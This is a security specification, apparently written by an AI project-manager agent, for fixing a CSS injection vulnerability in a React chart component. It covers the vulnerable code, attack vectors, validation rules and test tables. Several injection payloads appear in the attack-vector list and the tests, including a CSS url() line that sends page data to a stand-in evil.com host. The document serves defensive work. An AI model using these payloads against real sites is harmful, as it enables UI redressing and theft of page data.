# Specification: Fix Chart Component CSS Injection Vulnerability

**Issue:** #162
**Status:** Groomed
**Author:** PM Agent
**Date:** 2026-10-25

---

## Problem Statement

The `ChartStyle` component in `frontend/src/components/ui/chart.tsx` (lines 64-91) builds a `<style>` element using `dangerouslySetInnerHTML`, directly interpolating user-controlled `config` keys and color/theme values into CSS without any validation or escaping.

### Vulnerable Code

```tsx
const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
  const colorConfig = Object.entries(config).filter(([, config]) => config.theme || config.color);

  if (!colorConfig.length) {
    return null;
  }

  return (
    <style
      dangerouslySetInnerHTML={{
        __html: Object.entries(THEMES)
          .map(
            ([theme, prefix]) => `
${prefix} [data-chart=${id}] {
${colorConfig
  .map(([key, itemConfig]) => {
    const color = itemConfig.theme?.[theme as keyof typeof itemConfig.theme] || itemConfig.color;
    return color ? `  --color-${key}: ${color};` : null;
  })
  .join("\n")}
}
`,
          )
          .join("\n"),
      }}
    />
  );
};
```

### Attack Vectors

1. **Key Injection (`key` in `config`)**: An attacker controlling the chart config key can inject arbitrary CSS:
   - Key: `"foo; color: red; --bar: "` → produces `--color-foo; color: red; --bar: : value;`
   - Key: `"foo} * { color: red; .bar { --baz: "` → breaks out of the rule entirely

2. **Color Value Injection (`color` or `theme[theme]`)**: An attacker controlling color values can inject arbitrary CSS:
   - Color: `"red; color: blue;"` → produces `--color-foo: red; color: blue;;`
   - Color: `"red} * { background: url(http://evil.com/exfil?data="` → exfiltrates data via CSS

3. **ID Injection (`id` prop)**: The `chartId` is interpolated directly into the CSS selector without escaping:
   - ID: `"foo] { color: red; } [data-chart=bar"` → breaks out of attribute selector

### Impact

- **CSS Injection**: Arbitrary styles injected into the page
- **UI Redressing**: Attacker can overlay invisible elements, hide security indicators, create fake login forms
- **Data Exfiltration**: CSS attribute selectors can leak data (e.g., `input[value^="a"] { background: url(/log?a) }`)
- **CSP Bypass**: If CSP allows `style-src 'unsafe-inline'`, this bypasses script restrictions

---

## User Stories

### US-1: Secure Chart Configuration
**As a** developer using the chart component  
**I want** to pass chart configuration without worrying about XSS  
**So that** my application remains secure even when config comes from untrusted sources

### US-2: Validated Color Values
**As a** developer  
**I want** color values to be validated against valid CSS color syntax  
**So that** malformed or malicious color strings are rejected

### US-3: Safe Key Handling
**As a** developer  
**I want** config keys to be sanitized for use as CSS custom property names  
**So that** special characters cannot break out of the CSS rule

### US-4: Migration Path
**As a** developer with existing charts  
**I want** a clear migration path for existing chart configurations  
**So that** my charts continue to work after the fix

---

## Acceptance Criteria

### AC-1: Color Value Validation
- **Given** a chart config with a color value
- **When** the color value is not a valid CSS color
- **Then** the color is rejected (not rendered in CSS) and a warning is logged
- **Valid CSS colors include**: named colors, `rgb()`, `rgba()`, `hsl()`, `hsla()`, `hex` (`#rgb`, `#rrggbb`, `#rgba`, `#rrggbbaa`), `color()`, `lab()`, `lch()`, `oklab()`, `oklch()`, `currentcolor`, `transparent`, `inherit`, `initial`, `unset`, `revert`, `revert-layer`

### AC-2: Key Sanitization
- **Given** a chart config with a key containing special characters
- **When** the key is used to generate a CSS custom property
- **Then** the key is sanitized to only contain valid CSS identifier characters (`[a-zA-Z0-9_-]`)
- **And** the sanitized key is used consistently (same input → same output)

### AC-3: ID Escaping
- **Given** a chart with an ID containing special characters
- **When** the ID is used in the CSS selector
- **Then** the ID is properly escaped for use in a CSS attribute selector
- **Escaping rules**: Escape `[`, `]`, `"`, `'`, `\`, and any non-ASCII characters per CSS escaping rules

### AC-4: No dangerouslySetInnerHTML
- **Given** the fixed ChartStyle component
- **When** rendering the component
- **Then** `dangerouslySetInnerHTML` is NOT used
- **And** styles are applied via React-managed mechanisms (e.g., `<style>` with safe content, or CSS-in-JS, or inline styles)

### AC-5: Backward Compatibility
- **Given** existing chart configurations with valid keys and colors
- **When** the component is rendered
- **Then** the charts render identically to before the fix
- **And** no console errors or warnings for valid inputs

### AC-6: Test Coverage
- **Given** the fix is implemented
- **When** running the test suite
- **Then** all new tests pass
- **And** coverage for the ChartStyle component is ≥90%

---

## Technical Approach

### Option A: React-Managed Style Element (Recommended)
Replace `dangerouslySetInnerHTML` with a React `<style>` element whose children are a validated/sanitized string. Since React 18, `<style>` elements can have string children without `dangerouslySetInnerHTML`.

```tsx
// Instead of dangerouslySetInnerHTML={{ __html: cssString }}
// Use:
<style>{cssString}</style>
```

This still requires the CSS string to be safe, but eliminates the React-specific XSS vector.

### Option B: CSS-in-JS / Inline Styles
Move to inline styles or a CSS-in-JS solution (e.g., `style` prop on elements, or a library like `emotion`). This is more invasive but eliminates the `<style>` element entirely.

### Option C: Construct Stylesheet via CSSOM
Use `document.adoptedStyleSheets` or `CSSStyleSheet` API to construct stylesheets programmatically. Most secure but requires more code and browser support considerations.

**Decision**: Use **Option A** (React-managed `<style>` with validated/sanitized content) as it's the minimal change with maximum security benefit. The validation/sanitization logic is the same regardless of output mechanism.

---

## Validation & Sanitization Functions

### `isValidCSSColor(value: string): boolean`
Validates that a string is a valid CSS color value.
- Use a comprehensive regex or a small parser
- Accept all standard CSS color formats
- Reject anything containing `;`, `{`, `}`, `(`, `)` in suspicious contexts (but allow them in valid functions like `rgb()`)
- **Implementation**: Use a strict allow-list regex for known color formats

### `sanitizeCSSCustomPropertyKey(key: string): string`
Sanitizes a key for use as a CSS custom property name (`--color-*`).
- Replace any character not matching `[a-zA-Z0-9_-]` with `_`
- Ensure it doesn't start with `--` (we add that prefix)
- Trim to reasonable length (e.g., 100 chars)
- **Deterministic**: Same input always produces same output

### `escapeCSSSelectorValue(value: string): string`
Escapes a value for safe use in a CSS attribute selector (`[data-chart=...]`).
- Per CSS spec: Escape `[`, `]`, `"`, `'`, `\` with backslash
- Escape non-ASCII: `\XX ` (hex + space) or `\XXXXXX ` (6-digit hex + space)
- **Reference**: https://drafts.csswg.org/cssom/#serialize-an-identifier

---

## Test Scenarios

### Unit Tests (Vitest)

#### `isValidCSSColor`
| Input | Expected | Description |
|-------|----------|-------------|
| `"red"` | `true` | Named color |
| `"#ff0000"` | `true` | Hex 6-digit |
| `"#f00"` | `true` | Hex 3-digit |
| `"#ff0000ff"` | `true` | Hex 8-digit (with alpha) |
| `"#f00f"` | `true` | Hex 4-digit (with alpha) |
| `"rgb(255, 0, 0)"` | `true` | RGB |
| `"rgba(255, 0, 0, 0.5)"` | `true` | RGBA |
| `"hsl(0, 100%, 50%)"` | `true` | HSL |
| `"hsla(0, 100%, 50%, 0.5)"` | `true` | HSLA |
| `"currentcolor"` | `true` | Keyword |
| `"transparent"` | `true` | Keyword |
| `"lab(50% 100 0)"` | `true` | LAB |
| `"oklch(50% 0.1 200)"` | `true` | OKLCH |
| `"red; color: blue"` | `false` | Injection attempt |
| `"red} * { color: blue"` | `false` | Injection attempt |
| `"url(http://evil.com)"` | `false` | Not a color |
| `"expression(alert(1))"` | `false` | IE expression |
| `"rgb(255, 0, 0); background: red"` | `false` | Injection in function |
| `""` | `false` | Empty string |
| `"not-a-color"` | `false` | Invalid name |

#### `sanitizeCSSCustomPropertyKey`
| Input | Expected Output | Description |
|-------|-----------------|-------------|
| `"foo"` | `"foo"` | Simple key |
| `"foo-bar"` | `"foo-bar"` | Hyphen allowed |
| `"foo_bar"` | `"foo_bar"` | Underscore allowed |
| `"foo.bar"` | `"foo_bar"` | Dot replaced |
| `"foo;bar"` | `"foo_bar"` | Semicolon replaced |
| `"foo}bar"` | `"foo_bar"` | Brace replaced |
| `"foo{bar"` | `"foo_bar"` | Brace replaced |
| `"foo bar"` | `"foo_bar"` | Space replaced |
| `"123foo"` | `"123foo"` | Numbers allowed |
| `"--foo"` | `"__foo"` | Double hyphen prefix sanitized |
| `"foo".repeat(50)` | `"foo...".substring(0, 100)` | Truncated |

#### `escapeCSSSelectorValue`
| Input | Expected Output | Description |
|-------|-----------------|-------------|
| `"simple"` | `"simple"` | No escaping needed |
| `"with[bracket]"` | `"with\[bracket\]"` | Brackets escaped |
| `"quote\"double"` | `"quote\"double"` | Double quote escaped |
| `"quote'single"` | `"quote\'single"` | Single quote escaped |
| `"backslash\\path"` | `"backslash\\\\path"` | Backslash escaped |
| `"café"` | `"caf\E9 "` | Non-ASCII escaped |
| `"😀"` | `"\1F600 "` | Emoji escaped |

### Integration Tests

#### ChartStyle Component Rendering
1. **Valid config with colors** → Renders correct CSS custom properties
2. **Valid config with themes** → Renders correct CSS for both light/dark
3. **Config with invalid color** → Invalid color omitted, warning logged
4. **Config with malicious key** → Key sanitized, no CSS injection
5. **Config with malicious color** → Color rejected, no CSS injection
6. **Config with malicious ID** → ID escaped in selector, no injection
7. **Empty config** → Returns `null`
8. **Config without color/theme** → Returns `null`

#### End-to-End (Playwright)
1. **Render chart with user-controlled config** → No style injection in DOM
2. **Chart with valid config** → Visual regression matches baseline
3. **Chart with theme switching** → Light/dark themes apply correctly

---

## API Changes

### Breaking Changes
None. The public API (`ChartContainer`, `ChartConfig` type) remains unchanged.

### Behavioral Changes
- Invalid color values are now silently ignored (with console warning in development)
- Config keys with special characters are sanitized (previously they would break CSS)
- Chart IDs with special characters are escaped (previously they would break selectors)

### Migration Notes
- **For valid configs**: No changes needed. Charts render identically.
- **For configs with special chars in keys**: Keys will be sanitized. If you relied on the broken CSS behavior, update keys to use only `[a-zA-Z0-9_-]`.
- **For invalid colors**: Fix the color values to valid CSS colors.

---

## Implementation Plan

### Phase 1: Core Validation Functions
1. Create `frontend/src/lib/chart-validation.ts` with:
   - `isValidCSSColor()`
   - `sanitizeCSSCustomPropertyKey()`
   - `escapeCSSSelectorValue()`
2. Add comprehensive unit tests for each function

### Phase 2: Refactor ChartStyle
1. Import validation functions
2. Apply validation/sanitization to config keys, colors, and ID
3. Replace `dangerouslySetInnerHTML` with React-managed `<style>` element
4. Add development-mode warnings for rejected values

### Phase 3: Testing
1. Add integration tests for ChartStyle component
2. Add E2E tests for chart rendering
3. Verify all existing chart usages still work

### Phase 4: Documentation
1. Update component documentation with security notes
2. Add migration guide if needed

---

## Files to Modify

1. `frontend/src/components/ui/chart.tsx` - Main fix
2. `frontend/src/lib/chart-validation.ts` - New validation utilities
3. `frontend/src/components/ui/__tests__/chart-validation.test.ts` - Unit tests for validation
4. `frontend/src/components/ui/__tests__/chart-style.test.tsx` - Integration tests for ChartStyle
5. `frontend/tests/e2e/chart-security.spec.ts` - E2E security tests (if E2E exists)

---

## Definition of Done

- [ ] Specification written and saved to `docs/specs/162-chart-xss.md`
- [ ] GitHub issue #162 updated to `groomed` label with spec link
- [ ] Validation functions implemented with 100% unit test coverage
- [ ] ChartStyle component refactored without `dangerouslySetInnerHTML`
- [ ] All integration tests pass
- [ ] E2E tests pass (if applicable)
- [ ] No regression in existing chart functionality
- [ ] `npm run typecheck` passes
- [ ] `npm run lint` passes
- [ ] `npm test` passes
- [ ] PM accepts the implementation

---

## Security Considerations

- This fix addresses a **Critical** severity vulnerability (CVSS 3.1: 7.1 - High)
- The vulnerability is exploitable when chart config comes from:
  - User input
  - API responses
  - URL parameters
  - Any untrusted data source
- Defense in depth: Even with validation, consider CSP `style-src 'self'` to limit impact of any future bypasses

---

## References

- [OWASP CSS Injection](https://owasp.org/www-community/attacks/CSS_Injection)
- [CSS Custom Properties Syntax](https://developer.mozilla.org/en-US/docs/Web/CSS/--*)
- [CSSOM: Serialize an Identifier](https://drafts.csswg.org/cssom/#serialize-an-identifier)
- [React dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerouslysetinnerhtml)
- [CSS Color Module Level 4](https://drafts.csswg.org/css-color-4/)